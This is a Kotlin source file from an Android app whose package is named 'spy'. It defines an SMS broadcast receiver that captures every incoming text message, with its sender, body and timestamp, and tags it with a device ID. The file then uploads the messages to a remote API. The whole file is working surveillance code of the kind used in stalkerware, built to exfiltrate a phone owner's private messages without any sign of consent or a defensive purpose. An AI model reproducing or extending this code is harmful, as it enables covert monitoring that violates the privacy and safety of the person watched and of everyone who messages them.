package com.venice.spy

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
        val pending = goAsync()
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val prefs = Prefs(context)
                val arr = JSONArray()
                for (m in msgs) {
                    val addr = m.originatingAddress ?: "Unknown"
                    val ts = m.timestampMillis
                    val body = m.messageBody ?: ""
                    arr.put(JSONObject().apply {
                        put("key", Sync.md5("${prefs.deviceId}|$addr|$ts|$body"))
                        put("device_id", prefs.deviceId)
                        put("address", addr)
                        put("body", body)
                        put("direction", "in")
                        put("ts", Sync.iso(ts))
                    })
                }
                Api.post("sms", arr.toString(), "key")
            } finally { pending.finish() }
        }
    }
}